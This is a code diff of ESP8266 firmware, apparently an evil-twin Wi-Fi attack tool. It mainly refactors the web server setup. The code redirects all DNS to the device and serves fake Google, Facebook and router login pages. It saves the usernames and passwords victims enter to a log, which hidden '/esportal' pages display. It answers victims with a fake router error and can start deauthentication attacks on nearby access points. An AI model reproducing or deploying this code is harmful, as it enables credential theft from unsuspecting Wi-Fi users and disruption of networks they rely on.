@@ -18,17 +18,18 @@
 #include "portal_login.h"
 #include "Deauth.h"
 #include "SimpleList.h"
-#include "WebService.h"
 
 #define LOGFILE "/log.txt"
 
 const byte DNS_PORT = 53;
-IPAddress apIP(192, 168, 1, 1);
+IPAddress apIP(192, 168, 8, 1);
 
 String webString = "";
 String serialString = "";
 Deauth d;
-WebService web(80, 1337);
+DNSServer dnsServer;
+ESP8266WebServer webServer(80);
+ESP8266WebServer httpServer(1337);
 size_t ap_counter = 0;
 bool deauth = false;
 
@@ -87,40 +88,40 @@ void setup() {
 
   //Start DNS Server
   Serial.print("Starting DNS Server...");
-  web.dnsServer.start(DNS_PORT, "*", apIP);
+  dnsServer.start(DNS_PORT, "*", apIP);
   Serial.println(" Success!");
 
   //check domain name and refresh page
-  web.webServer.onNotFound([]() {
-    web.webServer.send(200, "text/html", responseHTML);
+  webServer.onNotFound([]() {
+    webServer.send(200, "text/html", responseHTML);
   });
 
   //generic catch all login page for domains not listed in configuration
-  web.webServer.on(SITEOTHER_redirect, []() {
-    web.webServer.send_P(200, "text/html", GOOGLE_HTML);
+  webServer.on(SITEOTHER_redirect, []() {
+    webServer.send_P(200, "text/html", GOOGLE_HTML);
   });
 
   //SITE1 login page
-  web.webServer.on(SITE1_redirect, []() {
-    web.webServer.send_P(200, "text/html", GOOGLE_HTML);
+  webServer.on(SITE1_redirect, []() {
+    webServer.send_P(200, "text/html", GOOGLE_HTML);
   });
 
   //SITE2 login page
-  web.webServer.on(SITE2_redirect, []() {
-    web.webServer.send_P(200, "text/html", FACEBOOK_HTML);
+  webServer.on(SITE2_redirect, []() {
+    webServer.send_P(200, "text/html", FACEBOOK_HTML);
   });
 
   //Portal login page
-  web.webServer.on(PORTALLOGIN_redirect, []() {
-    web.webServer.send(200, "text/html", PORTAL_LOGIN_HTML);
+  webServer.on(PORTALLOGIN_redirect, []() {
+    webServer.send(200, "text/html", PORTAL_LOGIN_HTML);
   });
 
   //Validate-Save USER/PASS
-  web.webServer.on("/validate", []() {
+  webServer.on("/validate", []() {
     // store harvested credentials
-    String url = web.webServer.arg("url");
-    String user = web.webServer.arg("user");
-    String pass = web.webServer.arg("pass");
+    String url = webServer.arg("url");
+    String user = webServer.arg("user");
+    String pass = webServer.arg("pass");
 
     // sending to serial (DEBUG)
     serialString = user + ":" + pass;
@@ -137,7 +138,7 @@ void setup() {
 
     // send an error response
     webString = "<h1>#E701 - Router Configuration Error</h1>";
-    web.webServer.send(500, "text/html", webString);
+    webServer.send(500, "text/html", webString);
 
     // reset strings
     serialString = "";
@@ -147,7 +148,7 @@ void setup() {
   });
 
   //Log Page
-  web.webServer.on("/esportal/log", []() {
+  webServer.on("/esportal/log", []() {
     webString = "<html><body><a href=\"/esportal\"><- BACK TO INDEX</a><br><pre>";
     File f = SPIFFS.open(LOGFILE, "r");
     serialString = f.readString();
@@ -164,24 +165,24 @@ void setup() {
     }
     webString += "</table></body></html>";
 
-    web.webServer.send(200, "text/html", webString);
+    webServer.send(200, "text/html", webString);
     Serial.println(serialString);
     serialString = "";
     webString = "";
   });
 
   //Enable or disable deauthentication through web requests
-  web.webServer.on("/esportal/deauth", []() {
+  webServer.on("/esportal/deauth", []() {
     deauth = true;
     d.startScan();
     webString = "<html><head><script>function back(){window.history.go(-1);}</script></head><body onload='back()'>OK</body><html>";
-    web.webServer.send(200, "text/html", webString);
+    webServer.send(200, "text/html", webString);
     webString = "";
   });
-  web.webServer.on("/esportal/nodeauth", []() {
+  webServer.on("/esportal/nodeauth", []() {
     deauth = false;
     webString = "<html><head><script>function back(){window.history.go(-1);}</script></head><body onload='back()'>OK</body><html>";
-    web.webServer.send(200, "text/html", webString);
+    webServer.send(200, "text/html", webString);
     webString = "";
   });
 
@@ -189,8 +190,8 @@ void setup() {
 
   //Start Webserver
   Serial.print("Starting Web Server...");
-  web.webServer.begin();
-  web.httpServer.begin();
+  webServer.begin();
+  httpServer.begin();
 
   MDNS.addService("http", "tcp", 1337);
   Serial.println(" Success!");
@@ -202,9 +203,9 @@ void setup() {
 void loop() {
   //Check for DNS Request/Dish out Web Pages
   if (ap_counter == d.getAccessPoints()->size()) ap_counter = 0;
-  web.dnsServer.processNextRequest();
-  web.webServer.handleClient();
-  web.httpServer.handleClient();
+  dnsServer.processNextRequest();
+  webServer.handleClient();
+  httpServer.handleClient();
   if (deauth) d.startDeauth(d.getAccessPoints()->get(ap_counter++));
 
   unsigned long currentMillis = millis();
@@ -213,4 +214,3 @@ void loop() {
     //TODO
   }
 }
-
